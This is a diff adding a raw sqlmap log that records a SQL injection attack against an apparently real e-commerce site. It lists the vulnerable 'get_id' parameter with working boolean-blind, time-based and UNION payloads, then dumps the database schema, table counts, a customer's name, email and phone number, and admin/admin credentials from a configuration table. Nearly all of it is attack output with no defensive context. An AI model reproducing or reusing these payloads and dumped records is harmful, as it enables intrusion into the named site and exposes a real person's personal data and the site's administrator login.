@@ -1,0 +1,132 @@
+sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
+---
+Parameter: get_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: get_id=231 AND 6227=6227
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: get_id=231 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 17 columns
+    Payload: get_id=231 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a627871,0x78534277485142434d4978764b4f705a4c55426d7a727a7a4d7861475552434d7378464c744a7762,0x7171627071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FDXb
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] diskbrake
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: get_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: get_id=231 AND 6227=6227
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: get_id=231 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 17 columns
+    Payload: get_id=231 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a627871,0x78534277485142434d4978764b4f705a4c55426d7a727a7a4d7861475552434d7378464c744a7762,0x7171627071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FDXb
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: diskbrake
+[12 tables]
++-------------------+
+| cadastro          |
+| categoria         |
+| categoria_produto |
+| cliente           |
+| configuracao      |
+| frete             |
+| news              |
+| pagto             |
+| produto           |
+| subcategoria      |
+| tipopagto         |
+| venda             |
++-------------------+
+
+Database: diskbrake
++-------------------+---------+
+| Table             | Entries |
++-------------------+---------+
+| produto           | 643     |
+| categoria_produto | 640     |
+| subcategoria      | 29      |
+| categoria         | 3       |
+| cadastro          | 1       |
+| configuracao      | 1       |
+| news              | 1       |
++-------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: get_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: get_id=231 AND 6227=6227
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: get_id=231 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 17 columns
+    Payload: get_id=231 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a627871,0x78534277485142434d4978764b4f705a4c55426d7a727a7a4d7861475552434d7378464c744a7762,0x7171627071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FDXb
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: diskbrake
+Table: cadastro
+[1 entry]
++-------------+--------+-------+-------------------+--------+----------+
+| id_cadastro | nome   | ativo | email             | origem | telefone |
++-------------+--------+-------+-------------------+--------+----------+
+| 1           | Murilo | 1     | murilo@dwd.com.br | Site   | 78338722 |
++-------------+--------+-------+-------------------+--------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: get_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: get_id=231 AND 6227=6227
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: get_id=231 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 17 columns
+    Payload: get_id=231 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a627871,0x78534277485142434d4978764b4f705a4c55426d7a727a7a4d7861475552434d7378464c744a7762,0x7171627071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FDXb
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: diskbrake
+Table: configuracao
+[1 entry]
++----------+----------+------------+-------------+-------------+------------------------------+----------------------------+---------------+---------------+---------------------+
+| nu_tempo | de_senha | de_usuario | cd_destaque | nu_destaque | de_url_site                  | de_remetente               | cd_lancamento | nu_lancamento | de_url_visualizacao |
++----------+----------+------------+-------------+-------------+------------------------------+----------------------------+---------------+---------------+---------------------+
+| 5        | admin    | admin      | 1           | 9           | http://www.diskbrake.com.br/ | webmaster@diskbrake.com.br | 1             | 9             | <blank>             |
++----------+----------+------------+-------------+-------------+------------------------------+----------------------------+---------------+---------------+---------------------+
+
